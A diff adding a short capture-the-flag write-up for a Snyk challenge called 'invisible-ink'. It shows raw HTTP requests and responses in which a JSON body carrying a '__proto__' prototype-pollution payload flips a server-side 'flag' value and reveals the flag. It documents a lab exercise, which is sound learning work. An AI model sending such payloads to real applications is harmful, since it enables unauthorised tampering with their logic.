@@ -1,0 +1,63 @@
+The challenge mentioned a POST request made to the endpoint /echo with body content as follows: "message":"ping"
+
+The initial request:
+
+POST /echo HTTP/1.1
+Host: invisible-ink.c.ctf-snyk.io
+Content-Type: application/json
+Connection: close
+Content-Length: 23
+
+{
+"message": "ping"
+}
+
+The response:
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 99
+ETag: W/"63-MsMZZQ9Ub98US8NuaJ5GV8oSecM"
+Date: Wed, 02 Nov 2022 16:25:24 GMT
+Via: 1.1 google
+Connection: close
+
+{
+"userID":"154.68.180.241, 34.111.128.148",
+"time":1667406324703,
+"message":"ping",
+"flag":"disabled"
+}
+
+Solving the challenge, we want to target the flag object and change its value. This can be done with prototype pollution and setting the applicable value.
+
+The request made:
+
+POST /echo HTTP/1.1
+Host: invisible-ink.c.ctf-snyk.io
+Content-Type: application/json
+Connection: close
+Content-Length: 48
+
+{
+"message":{"__proto__":{"flag":"enabled"}}
+}
+
+The response from the server:
+
+HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 157
+ETag: W/"9d-8kfFY0Lv2qiJYhHddpsCymXbT88"
+Date: Wed, 02 Nov 2022 17:05:54 GMT
+Via: 1.1 google
+Connection: close
+
+{
+"userID":"154.68.180.241, 34.111.128.148",
+"time":1667408754606,
+"message":{},
+"flag":"SNYK{SOLVED}"
+}
